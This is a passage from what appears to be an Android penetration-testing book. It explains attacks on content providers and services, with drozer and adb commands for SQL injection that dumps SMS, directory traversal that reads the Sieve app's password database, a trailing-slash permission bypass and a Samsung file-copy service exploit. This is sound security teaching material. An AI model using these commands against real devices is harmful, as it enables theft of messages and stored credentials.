Content Provider: com.android.providers.telephony.NwkInfoProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
Authority: sms
Read Permission: android.permission.READ_SMS
Write Permission: android.permission.WRITE_SMS
Content Provider: com.android.providers.telephony.SmsProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
Authority: mms
Read Permission: android.permission.READ_SMS
Write Permission: android.permission.WRITE_SMS
Content Provider: com.android.providers.telephony.MmsProvider
Multiprocess Allowed: True
Grant Uri Permissions: True
Uri Permission Patterns:
Path: /part/
Type: PATTERN_PREFIX
Path: /drm/
Type: PATTERN_PREFIX
Authority: mms-sms
Read Permission: android.permission.READ_SMS
Write Permission: android.permission.WRITE_SMS
Content Provider: com.android.providers.telephony.MmsSmsProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
Authority: channels
Read Permission: null
Write Permission: null
Content Provider: com.android.providers.telephony.ChannelsProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
Querying the channel’s content provider returns no interesting information:
dz> run app.provider.query content://channels
| _id | channel_id | channel_name | is_checked |
Querying this content provider with a projection of a single quote character (') reveals a SQL injection
vulnerability:
dz> run app.provider.query content://channels --projection "'"
unrecognized token: "' FROM mychannels": , while compiling: SELECT ' FROM
mychannels
Using this injection point, all the tables in the database can be discovered.
dz> run scanner.provider.sqltables -a content://channels
Accessible tables for uri content://channels:
android_metadata
pdu
sqlite_sequence
addr
part
rate
drm
sms
raw
attachments
sr_pending
wpm
canonical_addresses
threads
pending_msgs
mychannels
words
words_content
words_segments
words_segdir
The most interesting table discovered is the sms table. Using SQL injection, the contents of this table can
be dumped.
dz> run app.provider.query content://channels --projection "* from sms
--"
| _id | thread_id | address | person | date | protocol
l | read | status | type | reply_path_present | subject | body |
service_center | locked | error_code | seen | deletable | hidden |
group_id | group_type | delivery_date |
| 1 | 1 | O2Roaming | null | 1402775640138 | 0
| 1 | -1 | 1 | 0 | null | While
away you can top-up just like at home by calling 4444 using your
debit or credit card for payment. Enjoy your trip! | +447802000332
| 0 | 0 | 1 | 1 | 0 | null | null
| null |
| 2 | 2 | +27820099985 | null | 1402776248043 | 0
| 1 | -1 | 1 | 0 | null | You have inserted
your SIM card in another cellphone. To request cellphone settings, reply
'yes' (free SMS) and Vodacom will send the settings to you. ...
This completely bypasses the need for an application to hold the READ_SMS permission on this device. You
can find more information in the advisory on this issue at
https://labs.mwrinfosecurity.com/system/assets/303/original/mwri_samsung_vulnerabilities_2011-
12-13.pdf.
File-Backed Content Providers
Implementing a content provider that allows other applications to retrieve files in a structured and secure way is
possible. However, the mechanisms for doing so can be prone to vulnerabilities that allow the retrieval of
arbitrary files under the UID of the content provider’s application. You can programmatically create these
content providers by implementing a public ParcelFileDescriptor openFile(Uri, String) method. If the URI
being requested is not strictly validated against a whitelist of allowed files or folders, this opens up the
application to attack. An easy way to check whether a content provider allows the retrieval of any file is by
requesting the /system/etc/hosts file, which always exists and is word readable on Android devices. The
following example shows how to exploit one such content provider in Sieve to retrieve /system/etc/hosts:
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProv
ider/system/etc/hosts
127.0.0.1 localhost
This example shows that you are not restricted to only querying intended files and can request any file on the
filesystem that Sieve has access to. Depending on the application, different files may be deemed good targets. In
the case of the Sieve application, the most important file it can access is its database that holds all the passwords
and application configuration. This is located in the private data directory of the application in the /databases/
folder.
root@android:/ # ls /data/data/com.mwr.example.sieve/databases/
database.db
database.db-journal
Next you can attempt to read this file from drozer, which should not be able to access it at all:
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProv
ider/data/data/com.mwr.example.sieve/databases/database.db > database.db
This exploit works and the file is transferred from the content provider to your local computer using this
vulnerability. Dumping the contents of this database reveals all of its data, including the master password and
pin. To verify this, use the sqlite3 tool to view the contents:
$ sqlite3 database.db .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE android_metadata (locale TEXT);
INSERT INTO "android_metadata" VALUES('en_US');
CREATE TABLE Passwords (_id INTEGER PRIMARY KEY,service TEXT,username TE
XT,password BLOB,email );
INSERT INTO "Passwords" VALUES(1,'Gmail','tyrone',X'CC0EFA591F665110CD34
4C384D48A2755291B8A2C46A683987CE13','PI:EMAIL');
INSERT INTO "Passwords" VALUES(2,'Internet Banking','tyrone123',X'5492FB
CE841D11EC9E610076FC302B94DBF71B59BE7E95821248374C5529514B62','tyrone@gm
ail.com');
CREATE TABLE Key (Password TEXT PRIMARY KEY,pin TEXT );
INSERT INTO "Key" VALUES('Thisismylongpassword123','1234');
COMMIT;
If the URI path provided to the openFile()function had been prepended with a static path in code that confined
it to the /data/data/com.mwr.example.sieve/ directory, how would you retrieve this file? Our intention in this
code is to restrict file reads to a certain directory only. In this case it may be possible to traverse out of the given
directory and access any file if the code does not properly perform proper input validation. If a prepended path
existed on the FileBackupProvider, you could use a directory traversal attack as follows to still retrieve
database.db:
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProv
ider/../../../../data/data/com.mwr.example.sieve/databases/database.db >
database.db
The appropriate amount of traverses would have to be determined by trial and error or by examining the source
code of the content provider.
A scanner module in drozer allows you to detect directory traversal attacks against file-backed content providers
as shown here:
dz> run scanner.provider.traversal -a content://com.mwr.example.sieve.Fi
leBackupProvider
...
Vulnerable Providers:
content://com.mwr.example.sieve.FileBackupProvider
REAL-WORLD EXAMPLE: SHAZAM
On September 10, 2012, Sebastián Guerrero Selma issued an advisory containing information about a
directory traversal vulnerability in the Shazam Android application. The proof of concept given showed
that reading from the following Shazam content provider would successfully retrieve the HOSTS file:
dz> run app.provider.read content://com.shazam.android.AdMarvelCachedIma
geLocalFileContentProvider/../../../../../../../../system/etc/hosts
127.0.0.1 localhost
An attacker could use this to get any files contained within the private data directory of the Shazam
application. The original advisory is at http://blog .seguesec.com/2012/09/path-traversal-
vulnerability-on- shazam-android-application/.
Pattern-Matching Flaws
In all aspects of computer security, logic flaws can exist. Rewinding back to where we discovered information
about the Sieve content providers, have a look again at the type of comparison being used to define a permission
on the /Keys path:
Authority: com.mwr.example.sieve.DBContentProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.DBContentProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
Path Permissions:
Path: /Keys
Type: PATTERN_LITERAL
Read Permission: com.mwr.example.sieve.READ_KEYS
Write Permission: com.mwr.example.sieve.WRITE_KEYS
The comparison is done using a literal check. You can find the original form of this check that drozer parsed out
in the following snippet of Sieve’s manifest:
On the  tag, the path attribute was used. The definition of the path attribute is as follows
from http://developer.android.com/guide/topics/manifest/path-permission-element.html:
A complete URI path for a subset of content provider data. Permission can be granted only to the particular
data identified by this path...
The key word in this definition is particular. This means that only the /Keys path is being protected by this
permission. What about the /Keys/ path? Querying the /Keys path you get a permission denial:
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProv
ider/Keys
Permission Denial: reading com.mwr.example.sieve.DBContentProvider uri
content://com.mwr.example.sieve.DBContentProvider/Keys from pid=1409,
uid=10059 requires com.mwr.example.sieve.READ_KEYS, or
grantUriPermission()
But when you query the /Keys/ path you get the following:
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProv
ider/Keys/
| Password | pin |
| Thisismylongpassword123 | 1234 |
This specific path including the appended slash was not protected by that permission. This is because a literal
comparison was used when there were other valid forms that reached the same data. Many other different types
of pattern-matching flaws could exist in an application that the reader would have to assess on a case-by-case
basis; however, this serves as an easy introduction to this vulnerability class on Android.
Attacking Insecure Services
Services are often used to run code inside an application that is important to keep running, even when the
application is not in the foreground. This scenario may apply to many applications or simply be used by a
developer for good application lifecycle management. Services can be started in a similar way to activities, with
an intent. These types of services can perform long-running tasks in the background. However, a second mode
of operation, which allows an application to bind to the service and pass messages to and from them over the
sandbox, also exists. This section explores attacking both of these types of services.
Unprotected Started Services
If a service is exported, either explicitly or implicitly, other applications on the device can interact with it.
Started services are ones that implement the onStartCommand() method inside its class. This method receives
intents destined for this service from applications and may be a source of vulnerabilities for an attacker. This is
completely dependent on what the code does inside this function. The code may perform an unsafe task even
just by being started or may use parameters that are sent and when certain conditions take place, perform an
unexpected action. This may seem like high-level information but it is because simply too many types of
problems exist that code could exhibit to mention here. The only way you can ferret out such problems is by
reading the code to understand what it is doing and find whether the potential exists to abuse it in some way. To
interact with started services use the app.service.start module in drozer.
REAL-WORLD EXAMPLE: CLIPBOARDSAVESERVICE ON SAMSUNG DEVICES
On July 31, 2012, André Moulu blogged about how a completely unprivileged application with no
permissions can escalate privileges in order to install another package by abusing application components.
Let us zoom into one of the vulnerabilities that he used so you can see how to copy an arbitrary file to the
SD card and thus overcome the need for the WRITE_EXTERNAL_STORAGE permission.
He discovered that a started service was exported in com.android.clipboardsaveservice that could be
used to copy a file from one location to another. This package also held the WRITE_EXTERNAL_STORAGE
permission, meaning that it could also copy to the SD card. Here is the proof of concept given by André:
$ adb shell am startservice -a com.android.clipboardsaveservice.CLIPBOAR
D_SAVE_SERVICE --es copyPath /sdcard/bla --es pastePath /sdcard/restore/
$ adb shell "ls -l /sdcard/restore/bla"
-rw-rw-r-- root sdcard_rw 5 2012-07-31 01:24 bla
This is a perfect example of a started service that uses provided extras to perform an action. The equivalent
command in drozer is as follows:
dz> run app.service.start --action com.android.clipboardsaveservice.CLIP
BOARD_SAVE_SERVICE --extra string copyPath /sdcard/bla --extra string
pastePath /sdcard/restore/
To find more information about this vulnerability go to http://sh4ka.fr/
android/galaxys3/from_0perm_to_INSTALL_PACKAGES_on_galaxy_S3.html.
In a similar way to other application components, you can start and stop services from a privileged context even
when they are not exported. You can do this by making use of the startservice and stopservice features of the
am utility.
Unprotected Bound Services
Bound services provide a mechanism for applications on a device to interconnect directly with each other using
remote procedure calls (RPCs). Bound services implement the onBind() method inside their service class. This
method must return an IBinder, which is part of the remote procedure call mechanism. An application can
implement a bound service in three ways, only two of which the application can use over the sandbox. These are
as follows:
Extending the Binder class—By returning an instance of the service class in the onBind method, it
provides the caller with access to public methods within the class. However, this is not possible across the
sandbox and can only be bound to by other parts of the same application’s code that is running in the same
process.
Using a messenger—By returning the IBinder of a Messenger class that has implemented a handler, the
applications can send messages between each other. These messages are defined by the Message class. As
part of a Message object, a “message code,” which is defined as the what variable, is specified and compared
against predefined values in the class’s handler code to perform different actions according to this value.
Sending arbitrary objects inside the Message object that can be used by the receiving code is also possible.
However, there is no direct interaction with methods when using this technique.
Using AIDL (Android Interface Definition Language)—Makes methods in an application available to
other applications over the sandbox using Inter-Process Communication (IPC). It performs marshalling of
common Java types and abstracts the implementation from the user. The way that developers use AIDL is by
populating .aidl files in the source code folder that contains information that defines an interface and
during compilation time generates a Binder interface from these files. This essentially converts the human-
friendly .aidl files into a Java class that can be invoked from code. Applications that have bound to a service
of this nature with the correct Binder class generated from the same AIDL can make use of the remote
methods available. Entire objects of custom classes can be sent using this method, as long as both the client
and service have the code of this class available and the class implements the Parcelable protocol. You can
explore this deeply technical method further in its documentation at
http://developer.android.com/guide/components/aidl.html. In our experience, very few application
developers attempt to make use of AIDL, simply because it is difficult to use and often not necessary. For the
large majority of cases, using a messenger instead of AIDL is easier and provides all that is needed to
communicate across applications.
You can find the official documentation on bound services at http://developer